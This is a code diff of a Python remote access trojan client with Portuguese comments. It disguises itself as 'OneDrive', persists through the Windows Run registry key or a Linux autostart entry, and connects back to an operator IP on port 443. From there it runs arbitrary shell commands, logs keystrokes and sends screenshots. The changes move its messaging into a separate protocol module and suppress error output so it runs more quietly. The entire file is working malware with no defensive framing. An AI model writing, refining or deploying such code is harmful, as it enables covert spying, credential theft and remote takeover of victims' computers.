@@ -4,18 +4,18 @@ import socket
 import subprocess
 import sys
 import platform
-import struct
-import io 
+import io
 from datetime import datetime
 from time import sleep
 from pynput import keyboard
 from PIL import ImageGrab
+import protocolo
 
 IS_WINDOWS = os.name == "nt"
 if IS_WINDOWS:
     import winreg
 
-IP = "coloque o ip aqui"
+IP = "coloque o ip"
 PORT = 443
 
 PROGRAM_NAME = "OneDrive"
@@ -58,7 +58,7 @@ def on_press(key):
 def get_keylog_data():
     global keylog_buffer
     if not keylog_buffer:  
-        return "[i] Keylog buffer is empty"  
+        return ""  
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")  
     data = f"[+] Keylog captured at {timestamp}:\n{''.join(keylog_buffer)}\n"  
     keylog_buffer = []  
@@ -84,14 +84,13 @@ def stop_keylogger():
     return "[+] Keylogger stopped.\n"
 
 def capture_screenshot():
-    """Captura a tela e retorna os bytes em formato PNG."""
     try:
         screenshot = ImageGrab.grab()
         img_byte_arr = io.BytesIO()
         screenshot.save(img_byte_arr, format='PNG')
         return img_byte_arr.getvalue()
     except Exception as e:
-        return f"[-] Screenshot error: {e}".encode()
+        return f"[-] Screenshot error: {type(e).__name__} - {e}".encode()
 
 def copy_system_file():
     try:
@@ -100,7 +99,6 @@ def copy_system_file():
             appdata_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows")
             if not os.path.exists(appdata_path):
                 os.makedirs(appdata_path)
-            # Garante a cópia do script .py ou .exe gerado pelo PyInstaller
             ext = ".exe" if current_file.endswith(".exe") else ".py"
             destination = os.path.join(appdata_path, f"{PROGRAM_NAME}{ext}")  
         else:
@@ -113,8 +111,7 @@ def copy_system_file():
             shutil.copy2(current_file, destination)  
             return destination  
         return current_file  
-    except Exception as e:
-        print(f"[-] Error copying file: {e}")
+    except Exception:
         return os.path.abspath(sys.argv[0])
 
 def check_persistence():
@@ -137,7 +134,6 @@ def setup_persistence():
         
         if IS_WINDOWS:
             key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REGISTRY_KEY_PATH, 0, winreg.KEY_SET_VALUE)
-            # Executa com o interpretador correto se for .py puro
             exec_command = f'"{sys.executable}" "{persistence_path}"' if persistence_path.endswith(".py") else f'"{persistence_path}"'
             winreg.SetValueEx(key, PROGRAM_NAME, 0, winreg.REG_SZ, exec_command)  
             winreg.CloseKey(key)  
@@ -147,14 +143,14 @@ def setup_persistence():
             desktop_entry = f"[Desktop Entry]\nType=Application\nExec={sys.executable} \"{persistence_path}\"\nHidden=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\nName={PROGRAM_NAME}\n"
             with open(DESKTOP_FILE_PATH, "w") as f:
                 f.write(desktop_entry)
-    except Exception as e:  
-        print(f"[-] Persistence setup error: {e}")
+    except Exception:  
+        pass
 
 def connect(ip, port):
     try:
         c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         c.connect((ip, port))
-        c.send("[#] Client connected\n".encode())
+        protocolo.enviar_mensagem(c, protocolo.MSG_TEXTO, "[#] Client connected\n".encode())
         return c
     except Exception:
         return None
@@ -166,13 +162,17 @@ def listen(c):
         try:
             if buffer_auto_send_pending:
                 data = get_keylog_data()
-                c.sendall(f"[AUTO-SENDING]\n{data}".encode())
+                if data:
+                    protocolo.enviar_mensagem(c, protocolo.MSG_KEYLOG, data.encode())
                 buffer_auto_send_pending = False
 
             try:
-                command = c.recv(1024).decode().strip()
+                tipo, payload = protocolo.ler_mensagem(c)
+                if tipo != protocolo.MSG_TEXTO:
+                    continue
+                command = payload.decode().strip()
                 if not command:
-                    break
+                    continue
             except socket.timeout:
                 continue
 
@@ -180,26 +180,25 @@ def listen(c):
                 break
             elif command == "/screenshot":
                 img_data = capture_screenshot()
-                # Avisa o servidor e envia o tamanho seguido dos bytes estruturados
-                c.sendall(f"[+] Sending screenshot ({len(img_data)} bytes)...\n".encode())
-                c.sendall(struct.pack(">I", len(img_data)) + img_data)
+                protocolo.enviar_mensagem(c, protocolo.MSG_IMAGEM, img_data)
             elif command == "/keylog_start":
                 res = start_keylogger()
-                c.sendall(res.encode())
+                protocolo.enviar_mensagem(c, protocolo.MSG_TEXTO, res.encode())
             elif command == "/keylog_dump":
                 res = get_keylog_data()
-                c.sendall(res.encode())
+                if not res:
+                    res = "[i] Buffer vazio\n"
+                protocolo.enviar_mensagem(c, protocolo.MSG_KEYLOG, res.encode())
             elif command == "/keylog_stop":
                 res = stop_keylogger()
-                c.sendall(res.encode())
+                protocolo.enviar_mensagem(c, protocolo.MSG_TEXTO, res.encode())
             else:
-                # Executa comandos normais do sistema operacional
                 proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                 stdout, stderr = proc.communicate()
                 output = stdout + stderr
                 if not output:
                     output = b"[+] Command executed (No output)\n"
-                c.sendall(output)
+                protocolo.enviar_mensagem(c, protocolo.MSG_TEXTO, output)
         except Exception:
             break
 
@@ -210,7 +209,7 @@ def main():
         if c:
             listen(c)
             c.close()
-        sleep(5)  # Tenta reconectar a cada 5 segundos se falhar
+        sleep(5)
 
 if __name__ == "__main__":
     main()
